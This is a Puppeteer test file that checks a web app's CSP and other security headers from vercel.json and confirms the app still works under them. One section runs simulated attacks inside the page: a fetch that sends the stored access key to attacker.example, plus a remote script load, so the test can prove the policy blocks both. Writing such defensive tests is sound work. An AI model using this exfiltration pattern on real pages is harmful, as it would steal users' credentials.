'use strict';
// Slice 10: security headers declared in vercel.json must (a) exist and (b) not
// break the real app. The page is served from a local HTTP server that applies
// exactly the headers from vercel.json, then driven in a real browser while
// every Content-Security-Policy violation is recorded. A second part proves the
// policy is actually enforcing (external scripts and external requests blocked).
const fs=require('fs');
const path=require('path');
const http=require('http');
const {createChecker}=require('./helpers/assert.cjs');

const ROOT=path.join(__dirname,'..');
const TYPES={'.html':'text/html; charset=utf-8','.css':'text/css; charset=utf-8','.js':'text/javascript; charset=utf-8','.json':'application/json','.png':'image/png','.woff2':'font/woff2','.woff':'font/woff','.ttf':'font/ttf','.svg':'image/svg+xml'};

function loadPuppeteer(){
  // Same strategy as test-browser-smoke.cjs: installed puppeteer, preferring an
  // already-installed system Chrome/Edge on Windows.
  const puppeteer=require('puppeteer');
  const installed=process.platform==='win32'?[
    'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'
  ]:[];
  const executablePath=installed.find(p=>fs.existsSync(p));
  return {puppeteer,launchOptions:executablePath?{executablePath}:{}};
}

module.exports=async function run(){
  const {check,getFailures}=createChecker();
  console.log('\n=== test-security-headers.cjs ===');
  const config=JSON.parse(fs.readFileSync(path.join(ROOT,'vercel.json'),'utf8'));
  const rule=(config.headers||[]).find(h=>h.source==='/(.*)');
  const headers=Object.fromEntries(((rule&&rule.headers)||[]).map(h=>[h.key.toLowerCase(),h.value]));

  console.log('\n1) required headers are declared for every route');
  check('a catch-all header rule exists',!!rule);
  check('nosniff is set',headers['x-content-type-options']==='nosniff');
  check('framing is denied',headers['x-frame-options']==='DENY');
  check('referrer policy limits cross-origin leakage',/strict-origin/.test(headers['referrer-policy']||''));
  const perms=headers['permissions-policy']||'';
  check('camera, microphone, geolocation and payment are disabled',['camera','microphone','geolocation','payment'].every(f=>perms.includes(f+'=()')));
  check('clipboard-write stays allowed for the app itself (auto-copy depends on it)',/clipboard-write=\(self\)/.test(perms));
  const csp=headers['content-security-policy']||'';
  const directive=n=>(csp.split(';').map(s=>s.trim()).find(s=>s.startsWith(n+' '))||'');
  check('CSP: default-src is self',directive('default-src')==="default-src 'self'");
  check('CSP: no remote script hosts and no eval',!/https?:|\*/.test(directive('script-src'))&&!/unsafe-eval/.test(csp));
  check('CSP: connections limited to this site (a stolen key cannot be posted elsewhere)',directive('connect-src')==="connect-src 'self'");
  check('CSP: plugins, base-uri, form targets and framing are locked down',
    /object-src 'none'/.test(csp)&&/base-uri 'self'/.test(csp)&&/form-action 'self'/.test(csp)&&/frame-ancestors 'none'/.test(csp));
  check('the existing function and rewrite settings were preserved',
    config.functions['api/generate.js'].includeFiles==='index.html'&&config.rewrites[0].source==='/api/ping');

  let puppeteer,launchOptions;
  try{({puppeteer,launchOptions}=loadPuppeteer());}
  catch(e){console.log('  SKIPPED browser part - no usable puppeteer + Chrome ('+e.message+')');return getFailures();}

  const server=http.createServer((req,res)=>{
    const url=new URL(req.url,'http://x');
    let rel=decodeURIComponent(url.pathname);
    if(rel==='/')rel='/index.html';
    const file=path.join(ROOT,rel);
    const baseHeaders={...Object.fromEntries(Object.entries(headers))};
    if(!file.startsWith(ROOT)||!fs.existsSync(file)||!fs.statSync(file).isFile()){res.writeHead(404,baseHeaders);return res.end('nf');}
    res.writeHead(200,{...baseHeaders,'content-type':TYPES[path.extname(file)]||'application/octet-stream'});
    res.end(fs.readFileSync(file));
  });
  await new Promise(r=>server.listen(0,'127.0.0.1',r));
  const origin='http://127.0.0.1:'+server.address().port;
  const browser=await puppeteer.launch({args:['--no-sandbox'],...launchOptions});
  try{
    const page=await browser.newPage();
    const pageErrors=[];page.on('pageerror',e=>pageErrors.push(e.message));
    await page.setRequestInterception(true);
    const apiCalls=[];
    page.on('request',r=>{
      const u=r.url();
      if(u.startsWith(origin+'/api/')){
        apiCalls.push(u);
        return r.respond({status:200,contentType:'application/json',body:JSON.stringify({text:'A complete report for the lesson.',usage:{output_tokens:5},trialStatus:null})});
      }
      if(!u.startsWith(origin)&&!u.startsWith('data:')&&!u.startsWith('blob:')){
        // Never touch the real internet from a test; recorded so a stray request is visible.
        apiCalls.push('EXTERNAL '+u);return r.abort();
      }
      r.continue();
    });
    await page.evaluateOnNewDocument(()=>{
      window.__csp=[];
      document.addEventListener('securitypolicyviolation',e=>window.__csp.push(e.violatedDirective+' '+e.blockedURI));
    });
    const consoleCsp=[];
    page.on('console',m=>{if(/Content Security Policy|Refused to/i.test(m.text()))consoleCsp.push(m.text());});
    await page.setViewport({width:1280,height:900});
    const response=await page.goto(origin+'/',{waitUntil:'load'});
    check('the browser actually received the CSP header',(response.headers()['content-security-policy']||'')===csp);

    console.log('\n2) the real app works under the policy');
    await page.evaluate(()=>{try{localStorage.setItem(ACCESS_KEY_STORAGE,'csp-test-key');}catch(e){}});
    await page.evaluate(async()=>{
      await Promise.all([document.fonts.load('700 22px Manrope'),document.fonts.load('400 16px Inter'),document.fonts.load('600 12px "JetBrains Mono"')]);
    });
    const fonts=await page.evaluate(()=>({m:document.fonts.check('700 22px Manrope'),i:document.fonts.check('400 16px Inter'),j:document.fonts.check('600 12px "JetBrains Mono"')}));
    check('bundled fonts load',fonts.m&&fonts.i&&fonts.j);
    const protocols=await page.evaluate(()=>[...document.querySelectorAll('#protocolSelect input[name="protocol"]')].map(i=>i.value));
    for(const p of protocols){
      await page.evaluate(v=>{const i=document.querySelector('#protocolSelect input[value="'+v+'"]');i.click();},p);
    }
    check('all seven protocols can be selected',protocols.length===7);
    await page.evaluate(()=>{
      document.getElementById('accountBtn').click();
      const c=document.getElementById('licenseModalCloseBtn');if(c)c.click();
      openHelpModal();closeHelpModal();
    });
    await page.evaluate(()=>{
      document.querySelector('#protocolSelect input[value="MA"]').click();
      document.getElementById('studentName').value='Test Student';
      document.getElementById('studentName').dispatchEvent(new Event('input',{bubbles:true}));
      const n=document.getElementById('krispNotes');n.value='Practised reading and answered questions about the story.';
      n.dispatchEvent(new Event('input',{bubbles:true}));
      const rb=document.querySelector('#ratingTrack .rating-btn[data-value="4"]')||document.querySelectorAll('#ratingTrack .rating-btn')[3];
      if(rb)rb.click();
      document.getElementById('generateBtn').click();
    });
    await new Promise(r=>setTimeout(r,1500));
    check('Generate reached the same-origin API (connect-src self allows it)',apiCalls.some(u=>u===origin+'/api/generate'));
    const output=await page.evaluate(()=>document.body.innerText.includes('A complete report for the lesson.'));
    check('the generated report is displayed',output);

    console.log('\n3) zero policy violations and zero page errors during all of that');
    const violations=await page.evaluate(()=>window.__csp);
    check('no CSP violation events',violations.length===0);
    if(violations.length)console.log('    violations:',violations);
    check('no CSP messages in the console',consoleCsp.length===0);
    check('no uncaught JavaScript errors',pageErrors.length===0);
    if(pageErrors.length)console.log('    errors:',pageErrors);

    console.log('\n4) the policy genuinely blocks attacker behaviour');
    const attack=await page.evaluate(async()=>{
      const out={};
      try{await fetch('https://attacker.example/steal?k='+encodeURIComponent(localStorage.getItem(ACCESS_KEY_STORAGE)));out.fetch='allowed';}catch(e){out.fetch='blocked';}
      const s=document.createElement('script');s.src='https://attacker.example/x.js';
      out.script=await new Promise(r=>{s.onload=()=>r('loaded');s.onerror=()=>r('blocked');document.head.appendChild(s);setTimeout(()=>r('blocked'),1500);});
      const f=document.createElement('form');f.action='https://attacker.example/post';out.formAction=f.action;
      return out;
    });
    check('exfiltrating data with fetch to another site is blocked',attack.fetch==='blocked');
    check('loading a script from another site is blocked',attack.script==='blocked');
    await new Promise(r=>setTimeout(r,200));
    check('the blocked attempts were reported as CSP violations',(await page.evaluate(()=>window.__csp)).length>=2);
    check('nothing external was ever actually requested from the test browser',!apiCalls.some(u=>u.startsWith('EXTERNAL https://attacker.example')));
  }finally{
    await browser.close();
    await new Promise(r=>server.close(r));
  }
  return getFailures();
};
if(require.main===module){module.exports().then(n=>process.exit(n?1:0));}
